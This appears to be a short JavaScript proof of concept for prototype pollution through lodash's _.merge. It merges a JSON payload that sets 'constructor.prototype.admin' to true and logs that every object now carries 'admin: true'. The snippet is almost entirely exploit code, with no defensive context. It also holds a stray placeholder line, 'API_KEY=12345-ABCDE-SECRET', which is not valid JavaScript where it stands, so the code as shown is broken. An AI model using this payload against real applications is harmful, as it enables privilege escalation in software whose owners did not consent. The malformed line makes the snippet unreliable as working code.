const _ = require('lodash');
API_KEY=12345-ABCDE-SECRET



let payload = JSON.parse('{"constructor": {"prototype": {"admin": true}}}');
_.merge({}, payload);

console.log({}.admin);  // Outputs: true, indicating prototype pollution
